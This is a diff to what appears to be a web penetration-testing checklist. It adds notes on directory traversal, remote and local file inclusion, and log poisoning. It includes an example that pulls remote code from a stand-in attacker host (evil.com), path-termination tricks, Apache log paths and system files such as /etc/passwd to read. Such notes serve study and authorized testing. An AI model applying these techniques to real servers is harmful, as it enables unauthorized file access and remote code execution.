@@ -40,7 +40,7 @@
 * Directory Traversal
   * Find references to files and change the value to something else. 
   * Look for file extensions in URLs. 
-  * If you find a viable attack vector, try files accessible by all users (try the paths using encoding too; consider null characters to terminate file paths).
+  * If you find a viable attack vector, try files accessible by all users (try the paths using encoding too; consider null characters to terminate file paths on older versions of PHP).
     * Windows:
       * C:\boot.ini
       * C:\Windows\System32\Drivers\etc\hosts
@@ -48,12 +48,19 @@
       * /etc/passwd 
   * If you're able to access the web app's configuration files (ex: php.ini), you might be able to find credentials or determine if File Inclusions are allowed. 
     * Variables to check in the php.ini configuration file. 
-      * register_globals
-      * allow_url 
+      * register_globals: ???
+      * allow_url: on 
 * File Inclusions
   * Use the same techniques for identifying Directory Traversal vulnerabilities to find LFIs. 
-  * Try different ports to ensure firewalls are not a problem. 
-  * If you can't upload files to perform an LFI, try log poisoning. 
+  * For RFIs, try different ports to ensure firewalls are not a problem (ex: index.php?file=http://evil.com:443). 
+  * For RFIs, try null characters to terminate file paths (necessary when dealing with older versions of PHP).
+  * For RFIs, try ending your RFI paylods with ? so they're digested as part of the query string by the web server. 
+  * If you can't upload files to perform an LFI, try log poisoning. You need to know the following:
+    * File path for HTTP access log
+        * /var/log/apache/access.log
+        * /var/log/apache2/access.log
+        * /var/log/httpd/access.log
+    * Parameter to use (ex: file=, page=, cmd=)
 
 ## Explore
 * Admin Consoles
